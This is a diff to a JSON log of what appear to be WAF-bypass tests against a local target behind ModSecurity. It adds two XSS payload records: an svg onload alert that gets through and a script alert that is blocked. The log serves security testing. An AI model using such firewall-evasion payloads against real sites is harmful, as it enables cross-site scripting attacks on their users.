@@ -2401,5 +2401,35 @@
     "timestamp": "2026-10-27T22:50:55.958157+00:00",
     "attempts": 1,
     "success_rate": 0.0
+  },
+  {
+    "target": "http://target.local",
+    "waf_type": "ModSecurity",
+    "waf_version": null,
+    "technique_level": 2,
+    "technique_name": "tags",
+    "payload": "<svg onload=alert(1)>",
+    "headers": {},
+    "status_code": 200,
+    "success": true,
+    "failure_reason": null,
+    "timestamp": "2026-10-27T23:10:33.526499+00:00",
+    "attempts": 2,
+    "success_rate": 1.0
+  },
+  {
+    "target": "http://target.local",
+    "waf_type": "ModSecurity",
+    "waf_version": null,
+    "technique_level": 1,
+    "technique_name": "encoding",
+    "payload": "<script>alert(1)</script>",
+    "headers": {},
+    "status_code": 403,
+    "success": false,
+    "failure_reason": null,
+    "timestamp": "2026-10-27T23:10:33.534511+00:00",
+    "attempts": 2,
+    "success_rate": 0.0
   }
 ]
